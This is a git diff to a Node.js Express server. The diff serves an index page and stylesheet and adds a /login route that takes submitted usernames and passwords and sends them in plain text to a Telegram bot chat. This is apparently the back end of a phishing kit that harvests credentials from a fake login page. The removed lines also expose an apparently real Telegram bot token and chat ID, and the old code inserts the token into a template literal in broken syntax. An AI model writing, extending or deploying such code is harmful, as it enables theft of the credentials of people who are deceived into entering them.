@@ -1,22 +1,42 @@
-const express = require('express');
-const bodyParser = require('body-parser');
-const axios = require('axios');
+const express = require("express");
+const path = require("path");
+const bodyParser = require("body-parser");
+const axios = require("axios");
+require("dotenv").config();
 
 const app = express();
+
+// Middleware
 app.use(bodyParser.json());
+app.use(bodyParser.urlencoded({ extended: true }));
 
-const TELEGRAM_TOKEN = '8556980478:AAHadxPNtr0xh6Lt7phWLtxJuPi57kA6E4k';
-const CHAT_ID = '7782836076';
-
-app.post('/send-data', async (req, res) => {
-  const userText = req.body.text;
-
-  await axios.post(`https://api.telegram.org/bot${8556980478:AAHadxPNtr0xh6Lt7phWLtxJuPi57kA6E4k}/sendMessage`, {
-    chat_id: CHAT_ID,
-    text: `User typed: ${userText}`
-  });
-
-  res.send({ success: true });
+// Serve index.html
+app.get("/", (req, res) => {
+  res.sendFile(path.join(__dirname, "index.html"));
 });
 
-app.listen(3000, () => console.log('Server running on port 3000'));
+// Serve s.css
+app.get("/s.css", (req, res) => {
+  res.sendFile(path.join(__dirname, "s.css"));
+});
+
+// Handle login
+app.post("/login", async (req, res) => {
+  const { username, password } = req.body;
+
+  try {
+    // Send to Telegram bot
+    const telegramUrl = `https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`;
+    await axios.post(telegramUrl, {
+      chat_id: process.env.TELEGRAM_CHAT_ID,
+      text: `Login attempt:\nUser: ${username}\nPass: ${password}`
+    });
+
+    res.json({ success: true, message: "Sent to Telegram!" });
+  } catch (err) {
+    console.error(err);
+    res.json({ success: false, message: "Error sending to Telegram" });
+  }
+});
+
+module.exports = app;
